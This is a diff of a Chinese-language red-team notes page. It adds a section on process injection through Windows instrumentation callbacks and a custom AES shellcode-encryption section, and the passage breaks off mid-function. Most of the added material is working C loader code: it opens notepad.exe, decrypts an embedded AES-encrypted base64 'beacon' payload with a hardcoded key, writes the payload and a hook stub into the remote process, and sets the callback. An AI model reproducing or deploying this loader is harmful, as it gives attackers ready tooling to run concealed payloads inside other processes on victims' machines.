@@ -55,11 +55,13 @@
               {title: "TheardlessInjection", url: "#theardlessinjection" },
               {title: "Entry Point Injection", url: "#entry-point-injection" },
               {title: "DllNotificationInjection(2023/8)", url: "#dllnotificationinjection20238" },
+              {title: "NtSetInformationProcess", url: "#ntsetinformationprocess" },
           ]},
           {title: "Shellcode\u52a0\u89e3\u5bc6", url: "#shellcode_2", children: [
               {title: "\u4ea6\u6216", url: "#_5" },
               {title: "\u81ea\u5b9a\u4e49RC4", url: "#rc4" },
               {title: "AES", url: "#aes" },
+              {title: "\u81ea\u5b9a\u4e49AES", url: "#aes_1" },
           ]},
           {title: "\u5176\u4ed6", url: "#_6", children: [
               {title: "\u7a0b\u5e8f\u81ea\u5220\u9664\u529f\u80fd", url: "#_7" },
@@ -1061,6 +1063,268 @@ https://github.com/ShorSec/DllNotificationInjection
 <a href="https://shorsec.io/blog/dll-notification-injection/">https://shorsec.io/blog/dll-notification-injection/</a></p>
 <p>在远程进程中修改<code>PLDR_DLL_NOTIFICATION_ENTRY</code>成员，并使<code>Cookie</code>指向shellcode的地址。当远程进程加载dll之前会触发一个通知<code>LdrRegisterDllNotification</code>，从而触发shellcode
 <img alt="" src="../../images/20231007165719.png" /></p>
+<h2 id="ntsetinformationprocess">NtSetInformationProcess</h2>
+<p>https://github.com/OtterHacker/SetProcessInjection</p>
+<p>该方式使用Nirvana调试技术，在远程进程设置了一个hook，在hook设置恶意代码。当系统每次执行syscall后会立即调用hook。
+这种方式需要<code>SE_DEBUG_PRIVILEGE</code>权限。
+由于需要高权限，这种方式不适合作为初始访问使用。</p>
+<pre><code class="language-c">#include &quot;helpers.h&quot;
+#include &lt;TlHelp32.h&gt;
+#include &quot;sc.h&quot;
+
+//定义各种
+#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
+#define ProcessInstrumentationCallback 40
+#define SE_DEBUG_PRIVILEGE 0x100000                 
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)
+
+extern VOID InstrumentationHook(VOID);
+
+
+
+//定义SetInformationProcess结构体
+typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION
+{
+    ULONG Version;
+    ULONG Reserved;
+    PVOID Callback;
+} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;
+
+typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
+    DWORD Privilege,
+    BOOLEAN Enable,
+    BOOLEAN CurrentThread,
+    DWORD* OldStatus
+);
+
+typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
+    _In_ HANDLE hProcess,
+    _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass,
+    _In_reads_bytes_(ProcessInformationSize) LPVOID ProcessInformation,
+    _In_ DWORD ProcessInformationSize
+);
+
+//根据进程名获取进程句柄，这里是要注入的进程
+HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    NTSTATUS status = NULL;
+    HANDLE hProc = 0;
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (!snapshot) {
+        DEBUG(&quot;[x] Cannot retrieve the processes snapshot\n&quot;);
+        return NULL;
+    }
+    if (Process32First(snapshot, &amp;entry)) {
+        do {
+            if (strcmp((entry.szExeFile), procName) == 0) {
+                *PID = entry.th32ProcessID;
+                DEBUG(&quot;[+] Injecting into : %d\n&quot;, *PID);
+                hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
+                if (!hProc) { continue; }
+                return hProc;
+            }
+        } while (Process32Next(snapshot, &amp;entry));
+    }
+
+    return NULL;
+}
+
+
+
+int main(void) {
+    ULONG imageSize = 0;
+    HMODULE hNtdll = GetModuleHandle(&quot;ntdll.dll&quot;, &amp;imageSize);  //直接使用GetModuleHandle()获取ntdll句柄，可以进一步优化
+    if (!hNtdll) {
+        DEBUG(&quot;[x] Cannot load NTDLL.DLL\n&quot;);
+        return;
+    }
+    DWORD PID = 0;
+    HANDLE hProc = getProcHandlebyName(&quot;notepad.exe&quot;, &amp;PID);    //根据进程名获取进程句柄
+
+    if (!hProc) {       
+        DEBUG(&quot;[x] Cannot open the process\n&quot;);
+        return;
+    }
+
+    //一系列操作，找到NtSetInformationProcess和RtlAdjustPrivilege地址
+    DEBUG(&quot;[+] Starting hook deployment !\n&quot;);
+    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
+    pNtSetInformationProcess NtSetInformationProcess = GetProcAddress(hNtdll, &quot;NtSetInformationProcess&quot;);
+    pRtlAdjustPrivilege RtlAdjustPrivilege = GetProcAddress(hNtdll, &quot;RtlAdjustPrivilege&quot;);
+
+
+    //这个函数是通过sc.h来获取shellcode
+    buildsc();
+
+    size_t szOutput = 0;
+    DWORD size = 0;
+    unsigned char* file_enc = NULL;
+    BYTE* beaconContent = NULL;
+    size_t beaconSize = NULL;
+    file_enc = base64_decode(sc, sc_length, &amp;szOutput);  //先对shellcode base64解码
+
+    for (int i = 0; i &lt; sc_length; i++) {
+        printf(&quot;0x%x,&quot;, file_enc[i]);
+    }
+    printf(&quot;\n&quot;);
+
+    if (szOutput == 0) {
+        DEBUG(&quot;[x] Base64 decode failed \n&quot;);
+        return -1;
+    }
+
+
+    //使用key来AES解密
+    beaconSize = szOutput - 16;
+    beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE));
+    BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent);
+    if (!decryptStatus || beaconContent == NULL) {
+        DEBUG(&quot;[x] AES decryption failed\n&quot;);
+        return -1;
+    }
+
+    for (int i = 0; i &lt; beaconSize; i++) {
+        printf(&quot;0x%x,&quot;, beaconContent[i]);
+    }
+    printf(&quot;\n&quot;);
+
+
+    //在目标进程分配内存空间
+    LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!beaconAddress) {
+        DEBUG(&quot;[x] Cannot allocate beacon space : %d\n&quot;, GetLastError());
+        return;
+    }
+    DEBUG(&quot;[+] Beacon memory at : %p\n&quot;, beaconAddress);
+
+
+    //自定义汇编，使hook不要无限循环
+    SIZE_T shellcodeSize = 49;
+    BYTE shellcodeTemplate[49] = {
+        0x55,
+        0x48, 0x89, 0xe5,
+        0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00,
+        0x50,
+        0x53,
+        0x51,
+        0x41, 0x51,
+        0x41, 0x52,
+        0x41, 0x53,
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0xff, 0xd0,
+        0x41, 0x5b,
+        0x41, 0x5a,
+        0x41, 0x59,
+        0x59,
+        0x5b,
+        0x58,
+        0x5d,
+        0x41, 0xff, 0xe2
+    };
+        //push rbp
+        //mov rbp, rsp
+
+        //; This will modify the instruction push RBP into JMPR10
+        //mov qword ptr[rip – 15] 0xE2FF41
+
+        //push rax
+        //push rbx
+        //push rcx
+        //push r9
+        //push rl0
+        //push rll
+        //movabs rax, ${ CSAddr }
+        //call rax
+        //pop r11
+        //pop r10
+        //pop r9
+        //pop rcx
+        //pop rbx
+        //pop rax
+        //pop rbp
+        //jmp r10
+
+
+    BYTE shellcodeContent[49];
+    CopyMemory(shellcodeContent, shellcodeTemplate, shellcodeSize * sizeof(BYTE));
+    CopyMemory(shellcodeContent + 26, &amp;beaconAddress, sizeof(DWORD64));
+
+    //为汇编码分配内存空间
+    LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!shellcodeAddress) {
+        DEBUG(&quot;[x] Cannot allocate shellcode space : %d\n&quot;, GetLastError());
+        return;
+    }
+    DEBUG(&quot;[+] Shellcode memory at : %p\n&quot;, shellcodeAddress);
+
+    //shellcode写入内存
+    BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL);
+    if (!status) {
+        DEBUG(&quot;[x] Cannot write beacon content at %p : %d\n&quot;, beaconAddress, GetLastError());
+        return;
+    }
+
+    DEBUG(&quot;[+] Beacon content written at %p\n&quot;, beaconAddress);
+
+    //汇编码写入内存
+    status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL);
+    if (!status) {
+        DEBUG(&quot;[x] Cannot write shellcode content at %p : %d\n&quot;, shellcodeAddress, GetLastError());
+        return;
+    }
+    DEBUG(&quot;[+] Shellcode content written at %p\n&quot;, shellcodeAddress);
+
+    //修改内存属性
+    DWORD oldProtect = 0;
+    status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &amp;oldProtect);
+    if (!status) {
+        DEBUG(&quot;[x] Failed to reprotect beacon memory at %p : %d\n&quot;, beaconAddress, GetLastError());
+    }
+    DEBUG(&quot;[+] Beacon memory reprotected !\n&quot;);
+    status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &amp;oldProtect);
+    if (!status) {
+        DEBUG(&quot;[x] Failed to reprotect beacon memory at %p : %d\n&quot;, shellcodeAddress, GetLastError());
+    }
+    DEBUG(&quot;[+] Beacon shellcode reprotected !\n&quot;);
+
+
+    //设置hook
+    InstrumentationCallbackInfo.Version = 0;
+    InstrumentationCallbackInfo.Reserved = 0;
+    InstrumentationCallbackInfo.Callback = shellcodeAddress;
+    NTSTATUS ntStatus = NtSetInformationProcess(
+        hProc,
+        ProcessInstrumentationCallback,
+        &amp;InstrumentationCallbackInfo,
+        sizeof(InstrumentationCallbackInfo)
+    );
+    if (!NT_SUCCESS(ntStatus)) {
+        DEBUG(&quot;[x] Failed to deploy hook : %p \n&quot;, ntStatus);
+        return;
+    }
+    DEBUG(&quot;[+] Hook deployed successfully !\n&quot;);
+
+    BOOL hookCalled;
+    do {
+        DEBUG(&quot;[-] Waiting 5 seconds for the hook to be called...\n&quot;);
+        Sleep(5000);
+        BYTE content[1];
+        SIZE_T bytesRead;
+        status = ReadProcessMemory(hProc, shellcodeAddress, &amp;content, 1 * sizeof(BYTE), &amp;bytesRead);
+        if (!status) {
+            DEBUG(&quot;\t[x] Cannot read process memory : %d\n&quot;, GetLastError());
+            return;
+        }
+        DEBUG(&quot;\t[-] Value read: %2x\n&quot;, content[0]);
+        hookCalled = content == shellcodeContent[0];
+    } while (hookCalled);
+
+    DEBUG(&quot;[+] Your payload must be executed now !\n&quot;);
+}
+
+</code></pre>
 <h1 id="shellcode_2">Shellcode加解密</h1>
 <p>安装openssl库
 <code>https://slproweb.com/products/Win32OpenSSL.html</code></p>
@@ -1098,7 +1362,7 @@ int main(int argc, char* argv[])
 <pre><code>参考《0APCLdr-单文件》项目，Builder为加密，decrypt为解密，解密从资源表中加载
 </code></pre>
 <h2 id="aes">AES</h2>
-<p><code>不靠谱，依赖三方库</code>，需要改成自定义的AES</p>
+<p>依赖三方库，调用时需要把静态库放程序下面。</p>
 <pre><code class="language-C">#include &lt;cstdio&gt;
 #include &lt;openssl/aes.h&gt;
 #include &lt;corecrt_malloc.h&gt;
@@ -1170,6 +1434,999 @@ int main()
 
     return 0;
 }
+
+</code></pre>
+<h2 id="aes_1">自定义AES</h2>
+<p>3个头文件，2个c文件。使用python脚本加密</p>
+<p>详见《SetProcessInjection》项目</p>
+<p>aes.h
+加密算法头文件</p>
+<pre><code class="language-C">#pragma once
+#ifndef _AES_H_
+#define _AES_H_
+
+#include &lt;stdint.h&gt;
+#include &lt;stddef.h&gt;
+
+// #define the macros below to 1/0 to enable/disable the mode of operation.
+//
+// CBC enables AES encryption in CBC-mode of operation.
+// CTR enables encryption in counter-mode.
+// ECB enables the basic ECB 16-byte block algorithm. All can be enabled simultaneously.
+
+// The #ifndef-guard allows it to be configured before #include'ing or at compile time.
+#ifndef CBC
+#define CBC 1
+#endif
+
+#ifndef ECB
+#define ECB 1
+#endif
+
+#ifndef CTR
+#define CTR 1
+#endif
+
+
+//define AES128 1
+//#define AES192 1
+#define AES256 1
+
+#define AES_BLOCKLEN 16 // Block length in bytes - AES is 128b block only
+
+#if defined(AES256) &amp;&amp; (AES256 == 1)
+#define AES_KEYLEN 32
+#define AES_keyExpSize 240
+#elif defined(AES192) &amp;&amp; (AES192 == 1)
+#define AES_KEYLEN 24
+#define AES_keyExpSize 208
+#else
+#define AES_KEYLEN 16   // Key length in bytes
+#define AES_keyExpSize 176
+#endif
+
+struct AES_ctx
+{
+    uint8_t RoundKey[AES_keyExpSize];
+#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
+    uint8_t Iv[AES_BLOCKLEN];
+#endif
+};
+
+void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
+#if (defined(CBC) &amp;&amp; (CBC == 1)) || (defined(CTR) &amp;&amp; (CTR == 1))
+void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
+void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
+#endif
+
+#if defined(ECB) &amp;&amp; (ECB == 1)
+// buffer size is exactly AES_BLOCKLEN bytes; 
+// you need only AES_init_ctx as IV is not used in ECB 
+// NB: ECB is considered insecure for most uses
+void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
+void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
+
+#endif // #if defined(ECB) &amp;&amp; (ECB == !)
+
+
+#if defined(CBC) &amp;&amp; (CBC == 1)
+// buffer size MUST be mutile of AES_BLOCKLEN;
+// Suggest https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
+// NOTES: you need to set IV in ctx via AES_init_ctx_iv() or AES_ctx_set_iv()
+//        no IV should ever be reused with the same key 
+void AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
+void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
+
+#endif // #if defined(CBC) &amp;&amp; (CBC == 1)
+
+
+#if defined(CTR) &amp;&amp; (CTR == 1)
+
+// Same function for encrypting as for decrypting. 
+// IV is incremented for every block, and used after encryption as XOR-compliment for output
+// Suggesting https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS7 for padding scheme
+// NOTES: you need to set IV in ctx with AES_init_ctx_iv() or AES_ctx_set_iv()
+//        no IV should ever be reused with the same key 
+void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
+
+#endif // #if defined(CTR) &amp;&amp; (CTR == 1)
+
+
+#endif // _AES_H_
+
+</code></pre>
+<p>helpers.h   加密算法头文件</p>
+<pre><code class="language-C">#pragma once
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tchar.h&gt;
+#include &quot;aes.h&quot;
+
+#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)
+
+
+static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
+                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
+                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
+                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
+                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
+                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
+                                '4', '5', '6', '7', '8', '9', '+', '/' };
+static char* decoding_table = NULL;
+static int mod_table[] = { 0, 2, 1 };
+
+static int x64 = 1;
+extern int AES_KEY_LENGTH;
+void build_decoding_table();
+unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length);
+BOOL aes_decrypt(const uint8_t* key, size_t szKey, unsigned char* encrypted, size_t szEncrypted, unsigned char* unencryptedData);
+unsigned char* xor_text(const char* buff);
+wchar_t* char2wc(const char* buff);
+</code></pre>
+<p>sc.h 这里存储加密后的shellcode，使用python文件生成</p>
+<pre><code class="language-C">#define _CRT_SECURE_NO_WARNINGS
+#pragma once
+#include &lt;string.h&gt;
+
+const char sc_0[16] = {0x50,0x2b,0x32,0x37,0x52,0x73,0x6e,0x63,0x79,0x4c,0x79,0x53,0x31,0x44,0x59,0x45};
+char sc_1[16] = {0x46,0x4b,0x4b,0x5a,0x36,0x54,0x51,0x6b,0x4f,0x7a,0x43,0x4c,0x62,0x52,0x31,0x32};
+const char sc_2[16] = {0x66,0x44,0x62,0x4d,0x66,0x38,0x47,0x68,0x69,0x39,0x4f,0x34,0x58,0x48,0x67,0x33};
+char sc_3[16] = {0x54,0x31,0x32,0x39,0x48,0x54,0x44,0x34,0x4a,0x50,0x50,0x50,0x34,0x5a,0x56,0x33};
+const char sc_4[16] = {0x68,0x64,0x57,0x54,0x48,0x79,0x34,0x74,0x43,0x4b,0x41,0x42,0x6d,0x4d,0x32,0x51};
+char sc_5[16] = {0x2f,0x45,0x59,0x44,0x66,0x76,0x56,0x36,0x79,0x35,0x49,0x32,0x68,0x4b,0x5a,0x6f};
+const char sc_6[16] = {0x35,0x45,0x70,0x58,0x35,0x34,0x38,0x31,0x67,0x54,0x4a,0x75,0x64,0x36,0x75,0x62};
+char sc_7[16] = {0x4f,0x36,0x72,0x52,0x59,0x5a,0x70,0x68,0x56,0x50,0x43,0x37,0x57,0x41,0x67,0x61};
+const char sc_8[16] = {0x75,0x4e,0x73,0x6e,0x6d,0x56,0x76,0x44,0x7a,0x6f,0x62,0x69,0x36,0x79,0x4b,0x43};
+char sc_9[16] = {0x49,0x72,0x2f,0x34,0x6a,0x4a,0x38,0x70,0x38,0x67,0x36,0x43,0x36,0x4e,0x54,0x62};
+const char sc_10[16] = {0x70,0x71,0x34,0x4f,0x37,0x6a,0x4c,0x77,0x48,0x76,0x4e,0x76,0x6e,0x57,0x61,0x65};
+char sc_11[16] = {0x77,0x39,0x4e,0x48,0x5a,0x39,0x66,0x5a,0x6f,0x33,0x58,0x4e,0x4d,0x4e,0x6f,0x32};
+const char sc_12[16] = {0x77,0x38,0x73,0x47,0x64,0x55,0x62,0x6f,0x64,0x31,0x2f,0x44,0x69,0x6b,0x51,0x37};
+char sc_13[16] = {0x38,0x44,0x6b,0x4f,0x57,0x4b,0x54,0x55,0x54,0x65,0x69,0x46,0x73,0x51,0x52,0x74};
+const char sc_14[16] = {0x52,0x64,0x63,0x47,0x5a,0x63,0x51,0x36,0x5a,0x30,0x72,0x47,0x4b,0x48,0x6f,0x2f};
+char sc_15[16] = {0x32,0x61,0x4c,0x54,0x55,0x69,0x55,0x55,0x61,0x51,0x5a,0x43,0x6b,0x6f,0x78,0x50};
+const char sc_16[16] = {0x4f,0x34,0x76,0x57,0x72,0x67,0x69,0x6f,0x6a,0x53,0x79,0x76,0x46,0x64,0x68,0x69};
+char sc_17[16] = {0x7a,0x75,0x32,0x2b,0x35,0x56,0x41,0x7a,0x34,0x67,0x5a,0x58,0x75,0x7a,0x32,0x6a};
+const char sc_18[16] = {0x62,0x4d,0x54,0x32,0x54,0x52,0x2f,0x75,0x4a,0x4c,0x77,0x3d};
+
+char sc[300];
+int sc_length = 300;
+void buildsc_0(){
+    memcpy(&amp;sc[0], sc_0, 16);
+    memcpy(&amp;sc[16], sc_1, 16);
+    memcpy(&amp;sc[32], sc_2, 16);
+    memcpy(&amp;sc[48], sc_3, 16);
+    memcpy(&amp;sc[64], sc_4, 16);
+    memcpy(&amp;sc[80], sc_5, 16);
+    memcpy(&amp;sc[96], sc_6, 16);
+    memcpy(&amp;sc[112], sc_7, 16);
+    memcpy(&amp;sc[128], sc_8, 16);
+    memcpy(&amp;sc[144], sc_9, 16);
+    memcpy(&amp;sc[160], sc_10, 16);
+    memcpy(&amp;sc[176], sc_11, 16);
+    memcpy(&amp;sc[192], sc_12, 16);
+    memcpy(&amp;sc[208], sc_13, 16);
+    memcpy(&amp;sc[224], sc_14, 16);
+    memcpy(&amp;sc[240], sc_15, 16);
+    memcpy(&amp;sc[256], sc_16, 16);
+    memcpy(&amp;sc[272], sc_17, 16);
+    memcpy(&amp;sc[288], sc_18, 16);
+}
+void buildsc(){
+    buildsc_0();
+}
+BYTE key[] = &quot;UAigTdFeIYYOvkQjbWUkdfNOffvcutRW&quot;;
+
+</code></pre>
+<p>aes.c  加密算法源文件</p>
+<pre><code class="language-C">/*****************************************************************************/
+/* Includes:                                                                 */
+/*****************************************************************************/
+#include &lt;string.h&gt; // CBC mode, for memset
+#include &quot;aes.h&quot;
+#include &lt;stdio.h&gt;
+
+/*****************************************************************************/
+/* Defines:                                                                  */
+/*****************************************************************************/
+// The number of columns comprising a state in AES. This is a constant in AES. Value=4
+#define Nb 4
+
+#if defined(AES256) &amp;&amp; (AES256 == 1)
+#define Nk 8
+#define Nr 14
+#elif defined(AES192) &amp;&amp; (AES192 == 1)
+#define Nk 6
+#define Nr 12
+#else
+#define Nk 4        // The number of 32 bit words in a key.
+#define Nr 10       // The number of rounds in AES Cipher.
+#endif
+
+// jcallan@github points out that declaring Multiply as a function 
+// reduces code size considerably with the Keil ARM compiler.
+// See this link for more information: https://github.com/kokke/tiny-AES-C/pull/3
+#ifndef MULTIPLY_AS_A_FUNCTION
+#define MULTIPLY_AS_A_FUNCTION 0
+#endif
+
+
+
+
+/*****************************************************************************/
+/* Private variables:                                                        */
+/*****************************************************************************/
+// state - array holding the intermediate results during decryption.
+typedef uint8_t state_t[4][4];
+
+
+
+// The lookup-tables are marked const so they can be placed in read-only storage instead of RAM
+// The numbers below can be computed dynamically trading ROM for RAM - 
+// This can be useful in (embedded) bootloader applications, where ROM is often limited.
+static const uint8_t sbox[256] = {
+    //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
+    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
+    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
+    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
+    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
+    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
+    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
+    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
+    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
+    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
+    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
+    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
+    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
+    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
+    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
+    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
+    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 };
+
+#if (defined(CBC) &amp;&amp; CBC == 1) || (defined(ECB) &amp;&amp; ECB == 1)
+static const uint8_t rsbox[256] = {
+  0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
+  0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
+  0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
+  0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
+  0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
+  0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
+  0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
+  0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
+  0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
+  0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
+  0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
+  0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
+  0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
+  0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,
+  0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
+  0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d };
+#endif
+
+// The round constant word array, Rcon[i], contains the values given by 
+// x to the power (i-1) being powers of x (x is denoted as {02}) in the field GF(2^8)
+static const uint8_t Rcon[11] = {
+  0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };
+
+/*
+ * Jordan Goulder points out in PR #12 (https://github.com/kokke/tiny-AES-C/pull/12),
+ * that you can remove most of the elements in the Rcon array, because they are unused.
+ *
+ * From Wikipedia's article on the Rijndael key schedule @ https://en.wikipedia.org/wiki/Rijndael_key_schedule#Rcon
+ *
+ * &quot;Only the first some of these constants are actually used ?up to rcon[10] for AES-128 (as 11 round keys are needed),
+ *  up to rcon[8] for AES-192, up to rcon[7] for AES-256. rcon[0] is not used in AES algorithm.&quot;
+ */
+
+
+ /*****************************************************************************/
+ /* Private functions:                                                        */
+ /*****************************************************************************/
+ /*
+ static uint8_t getSBoxValue(uint8_t num)
+ {
+   return sbox[num];
+ }
+ */
+#define getSBoxValue(num) (sbox[(num)])
+
+ // This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states. 
+static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)
+{
+    unsigned i, j, k;
+    uint8_t tempa[4]; // Used for the column/row operations
+
+    // The first round key is the key itself.
+    for (i = 0; i &lt; Nk; ++i)
+    {
+        RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
+        RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
+        RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
+        RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
+    }
+
+    // All other round keys are found from the previous round keys.
+    for (i = Nk; i &lt; Nb * (Nr + 1); ++i)
+    {
+        {
+            k = (i - 1) * 4;
+            tempa[0] = RoundKey[k + 0];
+            tempa[1] = RoundKey[k + 1];
